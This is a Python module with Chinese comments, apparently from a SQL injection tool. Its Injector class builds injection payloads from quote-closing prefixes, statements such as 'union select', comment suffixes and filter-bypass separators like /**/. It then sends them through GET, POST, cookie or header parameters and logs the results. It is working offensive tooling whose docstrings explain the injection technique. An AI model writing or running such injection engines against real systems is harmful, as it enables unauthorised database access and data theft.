"""Injector：把「SQL 语句片段」变成「一次完整的注入请求」。

拼接公式：payload = prefix + 分隔符 + statement + suffix

    prefix     闭合方式。1'（用真实记录，布尔判断才有意义）
               / -1'（UNION 时让原查询结果为空，我们的数据才显示得出来）
    statement  具体注入语句：and 1=1 / order by 3 / union select ...
    suffix     注释符，把原 SQL 残余部分注释掉（见 config.py 的坑点说明）
    分隔符     由 Dialect 决定。默认空格，空格被过滤时换成 /**/ 或 tab
    注入位     由 InjectionPoint 决定：GET 参数 / POST 表单 / Cookie / 请求头

流程：拼接 -> 应用 bypass 变换管线 -> 发请求 -> 写历史 -> 返回结果。
"""
from bypass.syntax import Dialect
from core.pipeline import apply_transforms
from core.point import GetPoint, InjectionPoint


class Injector:
    def __init__(self, client, recorder, url, param,
                 prefix="1'", union_prefix="-1'", suffix="-- -", transforms=(),
                 point: InjectionPoint = None, dialect: Dialect = None):
        self.client = client
        self.recorder = recorder
        self.url = url
        self.param = param
        self.prefix = prefix
        self.union_prefix = union_prefix
        self.suffix = suffix
        self.transforms = list(transforms)
        # 注入位与语法方言都可以在运行中替换，其余代码只调 inject()
        self.point = point or GetPoint(param)
        self.dialect = dialect or Dialect()

    def inject(self, statement: str = "", prefix: str = None,
               suffix: str = None, stage: str = "misc"):
        """发送一次注入请求，返回 HttpResult。

        statement 为空时得到最原始的探测 payload（如 1'）。
        stage 是阶段标签，写入历史方便统计。
        """
        p = self.prefix if prefix is None else prefix
        s = self.suffix if suffix is None else suffix
        sp = self.dialect.space
        if statement:
            raw = f"{p}{sp}{statement}{s}".strip()
        else:
            raw = f"{p}{sp}{s}".strip()

        final = apply_transforms(raw, self.transforms)
        result = self.point.send(self.client, self.url, final)

        self.recorder.log(stage=stage, raw_payload=raw, final_payload=final, result=result)
        return result
